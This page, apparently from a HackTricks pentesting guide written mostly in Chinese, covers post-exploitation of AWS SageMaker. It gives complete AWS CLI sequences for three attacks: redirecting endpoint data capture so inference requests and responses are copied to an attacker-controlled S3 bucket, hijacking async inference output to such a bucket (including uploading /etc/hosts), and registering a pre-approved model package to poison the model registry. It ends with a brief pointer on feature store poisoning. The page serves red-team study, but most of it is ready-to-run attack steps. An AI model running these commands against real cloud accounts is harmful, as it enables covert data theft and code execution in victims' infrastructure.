# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## 通过 UpdateEndpoint DataCaptureConfig 从 SageMaker endpoint 抽取数据

滥用 SageMaker endpoint 管理功能，使完整的请求/响应可以捕获并发送到攻击者控制的 S3 bucket，而无需接触模型或容器。该方法使用零/低停机时间的滚动更新，并且仅需要 endpoint 管理权限。

### 要求
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (或在同一账号中使用现有 bucket)
- Optional (if using SSE‑KMS): `kms:Encrypt` on the chosen CMK
- Target: 同一账号/区域中已存在的 InService 实时 endpoint

### 步骤
1) 识别一个处于 InService 状态的 endpoint 并收集当前的 production variants
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) 准备 attacker S3 目标用于捕获
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) 创建一个新的 EndpointConfig，保留相同的 variants，但将 DataCapture 启用到 attacker bucket

注意：使用明确的内容类型以满足 CLI 验证。
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) 使用 rolling update 应用新配置 (最小/无停机)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) 生成至少一次推理调用（如果存在实时流量则可选）
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) 验证 attacker S3 中的捕获
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### 影响
- 将目标 endpoint 的实时推理请求和响应载荷（及元数据）完全 exfiltration 到攻击者控制的 S3 bucket。
- 不修改 model/container image，仅在 endpoint 级别进行更改，从而实现最小运营中断的隐蔽 data theft 路径。


## SageMaker 异步推理输出劫持 via UpdateEndpoint AsyncInferenceConfig

滥用 endpoint 管理，通过克隆当前 EndpointConfig 并设置 AsyncInferenceConfig.OutputConfig 的 S3OutputPath/S3FailurePath，将异步推理输出重定向到攻击者控制的 S3 bucket。该操作 exfiltrates 模型预测（以及容器包含的任何已转换输入），且无需修改 model/container。

### 要求
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: 能够向攻击者 S3 bucket 写入（通过 model execution role 或宽松的 bucket policy）
- 目标: 一个 InService endpoint，在此处异步调用已被使用或将被使用

### 步骤
1) 从目标 endpoint 收集当前的 ProductionVariants
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) 创建 attacker bucket（确保 model execution role 对其具有 PutObject 权限）
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) 克隆 EndpointConfig 并将 AsyncInference 输出劫持到攻击者 bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) 触发异步调用并验证对象是否到达攻击者的 S3
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### 影响
- 将异步推理结果（和错误正文）重定向到攻击者控制的 S3，从而在不更改模型代码或镜像且几乎无停机的情况下，隐蔽地外传预测结果以及容器产生的可能敏感的预处理/后处理输入。

## SageMaker Model Registry 通过 CreateModelPackage(Approved) 进行的供应链注入

如果攻击者能在目标 SageMaker Model Package Group 上执行 CreateModelPackage，就可以注册一个指向攻击者控制的容器镜像的新模型版本并立即将其标记为 Approved。许多 CI/CD 流水线会自动将 Approved 的模型版本部署到 endpoints 或 training jobs，从而导致攻击者在服务的执行角色下执行代码。宽松的 ModelPackageGroup 资源策略可能会放大跨账户的暴露。

### 要求
- IAM（污染现有组的最低权限）：`sagemaker:CreateModelPackage` 在目标 ModelPackageGroup 上
- 可选（如需在不存在时创建组）：`sagemaker:CreateModelPackageGroup`
- S3：对引用的 ModelDataUrl 的读取访问（或托管攻击者控制的制品）
- 目标：下游自动化会监视以寻找 Approved 版本的 Model Package Group

### 步骤
1) 设置区域并创建或查找目标 Model Package Group
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) 在 S3 中准备示例模型数据
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) 注册一个引用公共 AWS DLC 镜像的恶意（此处为良性）已批准的模型包版本
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) 验证新的 Approved 版本是否存在
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Impact
- 使用引用攻击者控制代码的 Approved 版本来污染 Model Registry。自动部署 Approved 模型的 Pipelines 可能会拉取并运行攻击者镜像，从而在 endpoint/training 角色下导致代码执行。
- 如果 ModelPackageGroup 资源策略（PutModelPackageGroupPolicy）权限宽松，此滥用可以跨账户触发。

## Feature store poisoning

在启用了 OnlineStore 的 Feature Group 上滥用 `sagemaker:PutRecord`，可覆盖被在线推理消费的实时特征值。结合 `sagemaker:GetRecord`，攻击者可以读取敏感特征。此操作不需要访问 models 或 endpoints。

{{#ref}}
feature-store-poisoning.md
{{/ref}}
{{#include ../../../../banners/hacktricks-training.md}}
